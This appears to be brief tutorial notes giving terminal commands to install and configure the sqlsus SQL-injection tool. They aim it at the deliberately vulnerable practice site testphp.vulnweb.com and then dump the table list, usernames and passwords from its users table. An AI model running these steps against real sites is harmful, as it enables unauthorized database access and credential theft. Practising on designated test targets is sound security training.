sudo apt-get install sqlsus

sqlsus -h

sqlsus -g sqlsus.conf
ls

vi sqlsus.conf
# our $url_start = "testphp.vulnweb.com/artists.php?artist=-1"

sqlsus ./sqlsus.conf
start
get tables
get columnsselect uname from users;
select pass from users;
select * from users;